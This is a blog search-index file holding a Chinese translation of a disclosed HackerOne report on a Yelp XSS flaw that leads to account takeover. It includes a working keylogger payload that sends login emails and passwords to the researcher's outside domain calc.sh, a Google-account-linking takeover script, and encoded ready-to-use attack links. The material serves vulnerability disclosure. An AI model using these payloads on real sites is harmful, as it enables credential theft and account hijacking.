<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hackerone漏洞报告-XSS ATO</title>
      <link href="/2023/08/18/Hackerone%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XSS%20ATO/"/>
      <url>/2023/08/18/Hackerone%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A-XSS%20ATO/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>漏洞名称：<strong>XSS ATO（通过登录键盘记录器，链接 Google 帐户）</strong><br>漏洞赏金：**<u>$5500 + $500</u>**<br>报告时间：世界标准时间 2023 年 6 月 2 日下午 2:40<br>提交报告者：lil_endian<br>报告编号  #2010530  已解决<br>报告已提交给 Yelp<br>已公开 2023年8月15日，协调世界时上午11:59<br>严重性：高（7 ~ 8.9）<br>弱点：跨站脚本（XSS）- 通用<br>耗时：无<br>CVE 编号：无<br>账户解锁：无</p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>yelp.com 在返回给用户的HTML中反映了cookie“guvo”的内容。在某些情况下，该值没有得到适当转义，导致了XSS漏洞。这可以与另一个问题相结合，即后端未能正确解析用户提供的cookie，从而允许我们将guvo cookie伪装成一个名为yelpmainpaastacanary的cookie。可以通过在对*.yelp.com的任何请求中包含URL查询参数?canary&#x3D;[Cookie值]来设置yelpmainpaastacanary cookie。</p><p>此报告展示了如何将此cookie XSS与cookie解析问题链接起来，从而在受害者的浏览器中导致持久性XSS漏洞。为了展示影响，我将展示如何利用此漏洞在<a href="https://biz.yelp.com/login%E4%B8%8A%E6%B3%A8%E5%85%A5%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8%EF%BC%8C%E4%BB%A5%E7%AA%83%E5%8F%96%E5%95%86%E4%B8%9A%E8%B4%A6%E6%88%B7%E7%9A%84%E7%94%B5%E5%AD%90%E9%82%AE%E4%BB%B6/%E5%AF%86%E7%A0%81%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E5%B0%86%E6%94%BB%E5%87%BB%E8%80%85%E7%9A%84Google%E8%B4%A6%E6%88%B7%E4%B8%8E%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84Yelp%E8%B4%A6%E6%88%B7%E5%85%B3%E8%81%94%E8%B5%B7%E6%9D%A5%EF%BC%8C%E5%B9%B6%E9%80%9A%E8%BF%87%E2%80%9C%E4%BD%BF%E7%94%A8Google%E8%B4%A6%E6%88%B7%E7%99%BB%E5%BD%95%E2%80%9D%E8%AE%BF%E9%97%AE%E5%8F%97%E5%AE%B3%E8%80%85%E7%9A%84%E8%B4%A6%E6%88%B7%E3%80%82">https://biz.yelp.com/login上注入键盘记录器，以窃取商业账户的电子邮件/密码，以及如何将攻击者的Google账户与受害者的Yelp账户关联起来，并通过“使用Google账户登录”访问受害者的账户。</a></p><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><h3 id="通过”guvo”-cookie-进行的XSS攻击"><a href="#通过”guvo”-cookie-进行的XSS攻击" class="headerlink" title="通过”guvo” cookie 进行的XSS攻击"></a>通过”guvo” cookie 进行的XSS攻击</h3><p>在一些页面上，cookie guvo 的值被反映（未转义）。最有趣的是在 <a href="http://www.yelp.com/">www.yelp.com</a> 的首页以及 <a href="https://biz.yelp.com/login">https://biz.yelp.com/login</a> 的登录页面上。未经转义的反射发生在 window.ySitRepParams 对象和 window.yelp.guv 属性中。可以通过在浏览器或Burp中将cookie添加到请求中，并观察响应来看到这一点：</p><p><a href="https://sm.ms/image/oGBnX72RHZ45Y3z" target="_blank"><img src="https://s2.loli.net/2023/08/18/oGBnX72RHZ45Y3z.png" ></a></p><p><a href="https://sm.ms/image/crAmblJXK68aQfi" target="_blank"><img src="https://s2.loli.net/2023/08/18/crAmblJXK68aQfi.png" ></a></p><h3 id="设置-“yelpmainpaastacanary”-cookie"><a href="#设置-“yelpmainpaastacanary”-cookie" class="headerlink" title="设置 “yelpmainpaastacanary” cookie"></a>设置 “yelpmainpaastacanary” cookie</h3><p>在 yelp.com 上有一个功能，通过在请求中添加查询参数 ?canary&#x3D;asdf，响应将包含一个 HTTP 头部：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf; Domain=.yelp.com; Path=/; Secure; SameSite=Lax</span><br></pre></td></tr></table></figure><p>这为我们提供了一种将yelpmainpaastacanary cookie设置为我们想要的任何值的方法。但是我们需要一种控制 guvo cookie 的方式。事实证明，我们可以将 guvo cookie 偷偷藏在 yelpmainpaastacanary cookie 内部。</p><h3 id="损坏的-cookie-解析和-cookie-走私"><a href="#损坏的-cookie-解析和-cookie-走私" class="headerlink" title="损坏的 cookie 解析和 cookie 走私"></a>损坏的 cookie 解析和 cookie 走私</h3><p>Yelp 后端将通过空格而不是分号来解析用户的 cookie。通常，由浏览器发送的 cookie 将会以分号分隔，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: a=1; b=2;</span><br></pre></td></tr></table></figure><p>这应该被解析为一个名为 a 值为 “1 b&#x3D;2” 的 cookie，但 Yelp 将其解析为两个名为 a 和 b 的 cookie。我们可以滥用这一点，通过向以下地址发出请求，将 guvo cookie 偷偷藏在 yelpmainpaastacanary cookie 内：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E</span><br></pre></td></tr></table></figure><p><a href="https://sm.ms/image/8f3IaLSleTHWvG9" target="_blank"><img src="https://s2.loli.net/2023/08/18/8f3IaLSleTHWvG9.png" ></a></p><p>这将设置 cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf guvo=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;; Domain=.yelp.com; Path=/; Secure; </span><br></pre></td></tr></table></figure><p>并导致我们的 XSS 载荷每次访问 <a href="http://www.yelp.com/">www.yelp.com</a> 的首页时都会触发：</p><p><a href="https://sm.ms/image/Kqa4enRGk8iVv7x" target="_blank"><img src="https://s2.loli.net/2023/08/18/Kqa4enRGk8iVv7x.png" ></a></p><p>作为额外的奖励，我们还可以注入一个 Max-Age: 99999999 属性，这样我们的 cookie 就不会过期，会一直存在于受害者的浏览器中，等待我们的 XSS 注入发生：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E%3B%20Max%2DAge%3D99999999</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: yelpmainpaastacanary=asdf </span><br><span class="line">guvo=&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;; </span><br><span class="line">Max-Age=99999999; </span><br><span class="line">Domain=.yelp.com; </span><br><span class="line">Path=/; Secure; </span><br><span class="line">SameSite=Lax</span><br></pre></td></tr></table></figure><h3 id="POCs"><a href="#POCs" class="headerlink" title="POCs"></a>POCs</h3><p>请注意：由于我位于丹麦，yelp.com 将会重定向到 yelp.dk。这些攻击在两个域上的工作方式完全相同。</p><h3 id="在-biz-yelp-com-x2F-login-上的键盘记录器"><a href="#在-biz-yelp-com-x2F-login-上的键盘记录器" class="headerlink" title="在 biz.yelp.com&#x2F;login 上的键盘记录器"></a>在 biz.yelp.com&#x2F;login 上的键盘记录器</h3><p>当用户输入或提交登录表单时，以下 JavaScript 片段将泄露 <a href="https://biz.yelp.com/login">https://biz.yelp.com/login</a> 上电子邮件和密码字段的内容。这些凭据将泄露到我拥有的域名 calc.sh：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  a = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;password&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">  b = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;email&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">`https://calc.sh/?a=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(a.value)&#125;</span>&amp;b=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(b.value)&#125;</span>`</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a.<span class="property">form</span>.<span class="property">onclick</span>=f;</span><br><span class="line">  a.<span class="property">onchange</span>=f;</span><br><span class="line">  b.<span class="property">onchange</span>=f;</span><br><span class="line">  a.<span class="property">oninput</span>=f;</span><br><span class="line">  b.<span class="property">oninput</span>=f;</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>我们创建一个链接，用于设置 guvo cookie 以在登录页面上触发此有效负载。请参阅此 CyberChef 配方，了解其操作方法并轻松进行修改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C&#x27;&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;$&#x27;%7D,&#x27;%5C&#x27;))//;Max-Age%3D99999999&#x27;,true,false,true,false)URL_Encode(true)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;https://yelp.com/?canary%3D&#x27;,true,false,true,false)&amp;input=c2V0VGltZW91dChmdW5jdGlvbiAoKSB7CiAgYSA9IGRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCdwYXNzd29yZCcpWzBdOwogIGIgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgnZW1haWwnKVswXTsKICBmdW5jdGlvbiBmKCkgewogICAgZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8/YT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKTsKICB9CiAgYS5mb3JtLm9uY2xpY2s9ZjsKICBhLm9uY2hhbmdlPWY7CiAgYi5vbmNoYW5nZT1mOwogIGEub25pbnB1dD1mOwogIGIub25pbnB1dD1mOwp9LCAxMDAwKQ</span><br></pre></td></tr></table></figure><p>我们的最终链接如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999</span><br></pre></td></tr></table></figure><p>任何访问该链接的人都将安装我们的键盘记录器。下面是一个展示其工作过程的简短视频：</p><p>视频演示地址：<br><a href="https://github.com/Bealee008/Hackerone_video/blob/main/biz.yelp.com-keylogger-poc.mp4">https://github.com/Bealee008/Hackerone_video/blob/main/biz.yelp.com-keylogger-poc.mp4</a></p><h3 id="通过链接-Google-账户实现账户接管"><a href="#通过链接-Google-账户实现账户接管" class="headerlink" title="通过链接 Google 账户实现账户接管"></a>通过链接 Google 账户实现账户接管</h3><p>将 Google 账户链接到 Yelp 账户的请求是从 <a href="https://yelp.com/profile_sharing">https://yelp.com/profile_sharing</a> 发出的。在 Google 链接流程中的最终请求是一个 POST 请求，发送到 <a href="https://www.yelp.dk/google_connect/register%EF%BC%8C%E5%85%B6%E4%B8%AD%E5%8C%85%E5%90%AB">https://www.yelp.dk/google_connect/register，其中包含</a> CSRF 令牌 csrftok 和一个令牌 id_token，该令牌将 Google 账户与 Yelp 账户关联起来。我们可以为我们自己的 Google 账户生成一个令牌，然后使用 XSS 将其链接到受害者的账户上。</p><p>要生成一个令牌，我们只需将 Google 账户链接到我们自己的 Yelp 账户，并在 Burp 中拦截最终请求：</p><p><a href="https://sm.ms/image/lCgMpJYGu1RkQHj" target="_blank"><img src="https://s2.loli.net/2023/08/18/lCgMpJYGu1RkQHj.png" ></a></p><p>现在我们有了用于 Google 账户 <a href="mailto:doodaduguc@gmail.com">doodaduguc@gmail.com</a> 的令牌，我们可以为受害者创建一个 XSS 载荷。在这段代码中，我们向 &#x2F;profile_sharing 发出请求，并使用正则表达式提取 csrf 令牌。然后，我们使用我们准备的 id_token 发出请求，将我们的 Google 账户链接到受害者的账户上：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>) &#123;</span><br><span class="line">  a = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">  a.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    rx = <span class="regexp">/&quot;GoogleConnect&quot;: &quot;([^&quot;]*)/</span>;</span><br><span class="line">    id_token = <span class="string">&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6IjYwODNkZDU5ODE2NzNmNjYxZmRlOWRhZTY0NmI2ZjAzODBhMDE0NWMiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL2FjY291bnRzLmdvb2dsZS5jb20iLCJuYmYiOjE2ODU3MTAxNjEsImF1ZCI6IjY5OTY5MTg5NTcxMS12bTJrOGVnYjMyN2hxM2wwYTdjcnNqMG8ybzlsZW42MS5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbSIsInN1YiI6IjEwNDA0MTA1MzkyMjQ5NDY3MjExNyIsImVtYWlsIjoiZG9vZGFkdWd1Y0BnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZSwiYXpwIjoiNjk5NjkxODk1NzExLXZtMms4ZWdiMzI3aHEzbDBhN2Nyc2owbzJvOWxlbjYxLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwibmFtZSI6IkRhZGUgTXVycGh5IiwicGljdHVyZSI6Imh0dHBzOi8vbGgzLmdvb2dsZXVzZXJjb250ZW50LmNvbS9hL0FBY0hUdGZGVlRFSU5fc3VVV01CTmpjSGFEWHg3TDJlbHFQMTVwNGhLaksxPXM5Ni1jIiwiZ2l2ZW5fbmFtZSI6IkRhZGUiLCJmYW1pbHlfbmFtZSI6Ik11cnBoeSIsImlhdCI6MTY4NTcxMDQ2MSwiZXhwIjoxNjg1NzE0MDYxLCJqdGkiOiJmNzYyZDZlZjEyZmFkNjI5YmE4YTY5OGFhMDNhMGM3NzU4MzYwYWUxIn0.K-XcaABVhUv-WmcpHLCEaDk5reYWH07Ab1QkUxhaGbNQYzt14ViPm2ybiIgJUKhyuwJzzAjllJvtrV2_NrUZnQ0vA_v7PuKO9GQVh72nYx5sWn6LjMsuWLh5d24Vk-Ry1CqC_xs2jEeh03emsZ-1Gha_-ABwlbCDH5yqeepNkh2EaYZ7cKVsUUxnIjpXKrO7xS7zP7aByt0mHA1gUSei-4aal_PVK4zIGa2GyvLCTQ3fqseDz7FCrQYO-3H-VK9O2NiBYZczbz_vLoRQtASeRgbj5jQUtEDjfzK8MTVgvWPVj3EZvt4Bbd0cp_oFmpL1WjMyB9mTtOKBSM3DaWdLNg&quot;</span>;</span><br><span class="line">    b = rx.<span class="title function_">exec</span>(<span class="variable language_">this</span>.<span class="property">responseText</span>);</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&quot;https://www.yelp.dk/google_connect/register&quot;</span>, &#123;<span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;body&quot;</span>: <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(&#123;<span class="string">&quot;id_token&quot;</span>: id_token, <span class="string">&quot;csrftok&quot;</span>: b[<span class="number">1</span>]&#125;)&#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">  a.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;https://www.yelp.dk/profile_sharing&#x27;</span>);</span><br><span class="line">  a.<span class="title function_">send</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>同样，我们使用这个 CyberChef 食谱来创建一个链接，感染受害者：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://gchq.github.io/CyberChef/#recipe=JavaScript_Minify()To_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;asdf%20guvo%3D%3C/script%3E%3Cscript%3Eeval(atob(%5C&#x27;&#x27;,true,false,true,false)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;$&#x27;%7D,&#x27;%5C&#x27;))//;Max-Age%3D99999999&#x27;,true,false,true,false)URL_Encode(true)Find_/_Replace(%7B&#x27;option&#x27;:&#x27;Regex&#x27;,&#x27;string&#x27;:&#x27;%5E&#x27;%7D,&#x27;https://yelp.com/?canary%3D&#x27;,true,false,true,false)&amp;input=KGZ1bmN0aW9uIGYoKSB7CiAgYSA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOwogIGEuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uICgpIHsKICAgIHJ4ID0gLyJHb29nbGVDb25uZWN0IjogIihbXiJdKikvOwogICAgaWRfdG9rZW4gPSAiZXlKaGJHY2lPaUpTVXpJMU5pSXNJbXRwWkNJNklqWXdPRE5rWkRVNU9ERTJOek5tTmpZeFptUmxPV1JoWlRZME5tSTJaakF6T0RCaE1ERTBOV01pTENKMGVYQWlPaUpLVjFRaWZRLmV5SnBjM01pT2lKb2RIUndjem92TDJGalkyOTFiblJ6TG1kdmIyZHNaUzVqYjIwaUxDSnVZbVlpT2pFMk9EVTNNVEF4TmpFc0ltRjFaQ0k2SWpZNU9UWTVNVGc1TlRjeE1TMTJiVEpyT0dWbllqTXlOMmh4TTJ3d1lUZGpjbk5xTUc4eWJ6bHNaVzQyTVM1aGNIQnpMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlNJc0luTjFZaUk2SWpFd05EQTBNVEExTXpreU1qUTVORFkzTWpFeE55SXNJbVZ0WVdsc0lqb2laRzl2WkdGa2RXZDFZMEJuYldGcGJDNWpiMjBpTENKbGJXRnBiRjkyWlhKcFptbGxaQ0k2ZEhKMVpTd2lZWHB3SWpvaU5qazVOamt4T0RrMU56RXhMWFp0TW1zNFpXZGlNekkzYUhFemJEQmhOMk55YzJvd2J6SnZPV3hsYmpZeExtRndjSE11WjI5dloyeGxkWE5sY21OdmJuUmxiblF1WTI5dElpd2libUZ0WlNJNklrUmhaR1VnVFhWeWNHaDVJaXdpY0dsamRIVnlaU0k2SW1oMGRIQnpPaTh2YkdnekxtZHZiMmRzWlhWelpYSmpiMjUwWlc1MExtTnZiUzloTDBGQlkwaFVkR1pHVmxSRlNVNWZjM1ZWVjAxQ1RtcGpTR0ZFV0hnM1RESmxiSEZRTVRWd05HaExha3N4UFhNNU5pMWpJaXdpWjJsMlpXNWZibUZ0WlNJNklrUmhaR1VpTENKbVlXMXBiSGxmYm1GdFpTSTZJazExY25Cb2VTSXNJbWxoZENJNk1UWTROVGN4TURRMk1Td2laWGh3SWpveE5qZzFOekUwTURZeExDSnFkR2tpT2lKbU56WXlaRFpsWmpFeVptRmtOakk1WW1FNFlUWTVPR0ZoTUROaE1HTTNOelU0TXpZd1lXVXhJbjAuSy1YY2FBQlZoVXYtV21jcEhMQ0VhRGs1cmVZV0gwN0FiMVFrVXhoYUdiTlFZenQxNFZpUG0yeWJpSWdKVUtoeXV3Snp6QWpsbEp2dHJWMl9OclVablEwdkFfdjdQdUtPOUdRVmg3Mm5ZeDVzV242TGpNc3VXTGg1ZDI0VmstUnkxQ3FDX3hzMmpFZWgwM2Vtc1otMUdoYV8tQUJ3bGJDREg1eXFlZXBOa2gyRWFZWjdjS1ZzVVV4bklqcFhLck83eFM3elA3YUJ5dDBtSEExZ1VTZWktNGFhbF9QVks0eklHYTJHeXZMQ1RRM2Zxc2VEejdGQ3JRWU8tM0gtVks5TzJOaUJZWmN6YnpfdkxvUlF0QVNlUmdiajVqUVV0RURqZnpLOE1UVmd2V1BWajNFWnZ0NEJiZDBjcF9vRm1wTDFXak15QjltVHRPS0JTTTNEYVdkTE5nIjsKICAgIGIgPSByeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KTsKICAgIGZldGNoKCJodHRwczovL3d3dy55ZWxwLmRrL2dvb2dsZV9jb25uZWN0L3JlZ2lzdGVyIiwgeyJtZXRob2QiOiAiUE9TVCIsICJib2R5IjogbmV3IFVSTFNlYXJjaFBhcmFtcyh7ImlkX3Rva2VuIjogaWRfdG9rZW4sICJjc3JmdG9rIjogYlsxXX0pfSkKICB9KTsKICBhLm9wZW4oJ0dFVCcsICdodHRwczovL3d3dy55ZWxwLmRrL3Byb2ZpbGVfc2hhcmluZycpOwogIGEuc2VuZCgpOwp9KSgpOw</span><br></pre></td></tr></table></figure><p>最终的链接如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27YT1uZXcgWE1MSHR0cFJlcXVlc3QsYS5hZGRFdmVudExpc3RlbmVyKCJsb2FkIiwoZnVuY3Rpb24oKXtyeD0vIkdvb2dsZUNvbm5lY3QiOiAiKFteIl0qKS8saWRfdG9rZW49ImV5SmhiR2NpT2lKU1V6STFOaUlzSW10cFpDSTZJall3T0ROa1pEVTVPREUyTnpObU5qWXhabVJsT1dSaFpUWTBObUkyWmpBek9EQmhNREUwTldNaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpwYzNNaU9pSm9kSFJ3Y3pvdkwyRmpZMjkxYm5SekxtZHZiMmRzWlM1amIyMGlMQ0p1WW1ZaU9qRTJPRFUzTVRBeE5qRXNJbUYxWkNJNklqWTVPVFk1TVRnNU5UY3hNUzEyYlRKck9HVm5Zak15TjJoeE0yd3dZVGRqY25OcU1HOHliemxzWlc0Mk1TNWhjSEJ6TG1kdmIyZHNaWFZ6WlhKamIyNTBaVzUwTG1OdmJTSXNJbk4xWWlJNklqRXdOREEwTVRBMU16a3lNalE1TkRZM01qRXhOeUlzSW1WdFlXbHNJam9pWkc5dlpHRmtkV2QxWTBCbmJXRnBiQzVqYjIwaUxDSmxiV0ZwYkY5MlpYSnBabWxsWkNJNmRISjFaU3dpWVhwd0lqb2lOams1TmpreE9EazFOekV4TFhadE1tczRaV2RpTXpJM2FIRXpiREJoTjJOeWMyb3diekp2T1d4bGJqWXhMbUZ3Y0hNdVoyOXZaMnhsZFhObGNtTnZiblJsYm5RdVkyOXRJaXdpYm1GdFpTSTZJa1JoWkdVZ1RYVnljR2g1SWl3aWNHbGpkSFZ5WlNJNkltaDBkSEJ6T2k4dmJHZ3pMbWR2YjJkc1pYVnpaWEpqYjI1MFpXNTBMbU52YlM5aEwwRkJZMGhVZEdaR1ZsUkZTVTVmYzNWVlYwMUNUbXBqU0dGRVdIZzNUREpsYkhGUU1UVndOR2hMYWtzeFBYTTVOaTFqSWl3aVoybDJaVzVmYm1GdFpTSTZJa1JoWkdVaUxDSm1ZVzFwYkhsZmJtRnRaU0k2SWsxMWNuQm9lU0lzSW1saGRDSTZNVFk0TlRjeE1EUTJNU3dpWlhod0lqb3hOamcxTnpFME1EWXhMQ0pxZEdraU9pSm1Oell5WkRabFpqRXlabUZrTmpJNVltRTRZVFk1T0dGaE1ETmhNR00zTnpVNE16WXdZV1V4SW4wLkstWGNhQUJWaFV2LVdtY3BITENFYURrNXJlWVdIMDdBYjFRa1V4aGFHYk5RWXp0MTRWaVBtMnliaUlnSlVLaHl1d0p6ekFqbGxKdnRyVjJfTnJVWm5RMHZBX3Y3UHVLTzlHUVZoNzJuWXg1c1duNkxqTXN1V0xoNWQyNFZrLVJ5MUNxQ194czJqRWVoMDNlbXNaLTFHaGFfLUFCd2xiQ0RINXlxZWVwTmtoMkVhWVo3Y0tWc1VVeG5JanBYS3JPN3hTN3pQN2FCeXQwbUhBMWdVU2VpLTRhYWxfUFZLNHpJR2EyR3l2TENUUTNmcXNlRHo3RkNyUVlPLTNILVZLOU8yTmlCWVpjemJ6X3ZMb1JRdEFTZVJnYmo1alFVdEVEamZ6SzhNVFZndldQVmozRVp2dDRCYmQwY3Bfb0ZtcEwxV2pNeUI5bVR0T0tCU00zRGFXZExOZyIsYj1yeC5leGVjKHRoaXMucmVzcG9uc2VUZXh0KSxmZXRjaCgiaHR0cHM6Ly93d3cueWVscC5kay9nb29nbGVfY29ubmVjdC9yZWdpc3RlciIse21ldGhvZDoiUE9TVCIsYm9keTpuZXcgVVJMU2VhcmNoUGFyYW1zKHtpZF90b2tlbjppZF90b2tlbixjc3JmdG9rOmJbMV19KX0pfSkpLGEub3BlbigiR0VUIiwiaHR0cHM6Ly93d3cueWVscC5kay9wcm9maWxlX3NoYXJpbmciKSxhLnNlbmQoKTs%3D%27%29%29%2F%2F%3BMax%2DAge%3D99999999</span><br></pre></td></tr></table></figure><p>这个视频展示了攻击过程。左侧是受害者，右侧是攻击者。受害者已经登录到他们的 Yelp 账户。然后，他退出登录，在某个时间点访问了我们恶意的链接。当受害者在以后的某个时间点再次登录他的 Yelp 账户时，我们的载荷触发，将我们的 Google 账户 <a href="mailto:doodaduguc@gmail.com">doodaduguc@gmail.com</a> 链接到了受害者的账户。攻击者现在可以使用 Google 账户登录，并进入受害者的账户。</p><p>视频演示地址：<br><a href="https://github.com/Bealee008/Hackerone_video/blob/main/google-link-ato-poc2.mp4">https://github.com/Bealee008/Hackerone_video/blob/main/google-link-ato-poc2.mp4</a></p><h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><p>这种攻击可以完全威胁到 Yelp.com 上的商业账户，并在普通账户上进行账户接管。由于 cookie 不会过期，受害者只需要在某个时间点访问我们的链接，当他们稍后尝试登录 yelp.com 时，就会受到威胁。这个链接可以通过 Yelp 论坛、评论或私信传播给其他用户，从而轻松地针对其他 Yelp 用户进行攻击。</p><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://hackerone.com/reports/2010530">https://hackerone.com/reports/2010530</a></p>]]></content>
      
      
      <categories>
          
          <category> Hackerone漏洞报告 - XSS ATO（通过登录键盘记录器，链接 Google 帐户） </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>蓝盾防火墙 RCE</title>
      <link href="/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/"/>
      <url>/2023/03/17/%E8%93%9D%E7%9B%BE%E9%98%B2%E7%81%AB%E5%A2%99%E5%89%8D%E5%8F%B0RCE/</url>
      
